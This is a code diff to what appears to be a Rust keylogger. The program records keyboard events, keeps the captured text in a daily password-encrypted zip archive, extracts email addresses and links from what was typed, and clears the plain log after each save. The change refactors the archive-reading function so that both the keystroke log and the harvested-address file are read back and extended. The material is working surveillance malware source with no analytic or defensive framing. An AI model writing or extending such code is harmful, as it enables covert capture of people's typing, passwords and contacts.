@@ -167,7 +167,8 @@ fn track_activity(event: Event) {
         EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
         EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
         EventType::KeyPress(Key::Return) => {
-            let zipped_string: String = readzip();
+            let zipped_logs1: String = readlogs("log.txt");
+            let zipped_logs2: String = readlogs("mails.txt");
 
             let now = Utc::now();
             let x: String = format!("{}", now);
@@ -181,9 +182,10 @@ fn track_activity(event: Event) {
             let mut data = String::new();
             fileRead.read_to_string(&mut data);
 
-            let logs = zipped_string + &data + "\n" + &now_parsed.to_string() + "\n";
-            let mails: String = links(data.clone());
-            zip_main(logs, mails);
+            let logs1 = zipped_logs1 + &data + "\n" + &now_parsed.to_string() + "\n";
+            let logs2 = zipped_logs2 + "\n" + &links(data.clone());
+
+            zip_main(logs1, logs2);
 
             let mut fileClear = OpenOptions::new()
                 .write(true)
@@ -246,7 +248,9 @@ fn dozip(logs: String, mails: String) -> ZipResult<()> {
     Ok(())
 }
 
-fn readzip() -> String {
+fn readlogs(filename: &str) -> String {
+    let lname = format!("text/{}", filename);
+
     let now: DateTime<Utc> = Utc::now();
     let fname = now.format("%Y-%m-%d").to_string() + ".zip";
     let file = match fs::File::open(fname) {
@@ -264,10 +268,10 @@ fn readzip() -> String {
 
     let mut archive = ZipArchive::new(reader).unwrap();
 
-    let mut file = match archive.by_name_decrypt("text/log.txt", PASS) {
+    let mut file = match archive.by_name_decrypt(&lname, PASS) {
         Ok(file) => file.unwrap(),
         Err(..) => {
-            println!("File text/log.txt not found in the zip.");
+            println!("File text/{} not found in the zip.", filename);
             return String::from("");
         }
     };
